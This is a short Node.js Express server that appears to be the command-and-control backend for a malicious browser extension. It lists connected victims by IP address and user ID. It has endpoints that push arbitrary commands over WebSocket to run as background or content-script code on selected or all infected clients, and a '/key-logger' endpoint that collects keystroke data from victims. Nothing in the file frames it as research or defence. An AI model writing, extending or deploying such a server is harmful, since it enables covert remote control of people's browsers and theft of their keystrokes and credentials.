import express from 'express';
import cors from 'cors';
import http from 'http';
import ws_server, {CLIENTS} from "./ws_server.js";


const app = express();

// Middleware to disable cors
app.use(cors())

// Middleware to parse JSON bodies
app.use(express.json());

app.get('/clients', (req, res) => {
    res.json(CLIENTS.map(client => {
        return {
                ip: client._socket.remoteAddress,
                uid: client.userId
            }
        })
    )
})

app.post(`/clients/send-command`, (req, res) => {
    if (!req.body.command) {
        res.status(400).send('Bad request')
        return
    }

    const message = {
        data: req.body.command,
        type: []
    }

    if (req.body.type.includes('BACKGROUND')) {
        message.type.push('BG_COMMAND')
    }
    if (req.body.type.includes('CONTENT-SCRIPT')) {
        message.type.push('CS_COMMAND')
    }

    const jsonMessage = JSON.stringify(message)

    const clients = CLIENTS.filter((client) => req.body.clients.includes(client.userId))

    clients.forEach(client => {
        console.log('Sending command to client: ', client.userId)
        client.send(jsonMessage)
    })
    res.status(200).send('Command sent')
})


// POST request handler
app.post('/key-logger', (req, res) => {
    console.log(req.body); // Logs the request body to the console
    res.status(200)
});

app.post('/send-command', (req, res) => {
    if (!req.body.command) {
        res.status(400).send('Bad request')
        return
    }

    const message = {
        data: req.body.command
    }

    if (req.body.type === 'BACKGROUND') {
        message.type = 'BG_COMMAND'
    } else if (req.body.type === 'CONTENT-SCRIPT') {
        message.type = 'CS_COMMAND'
    }

    const jsonMessage = JSON.stringify(message)

    CLIENTS.forEach(client => {
        client.send(jsonMessage)
    })

    res.status(200).send('Command sent')
})

export const http_server = http.createServer(app);
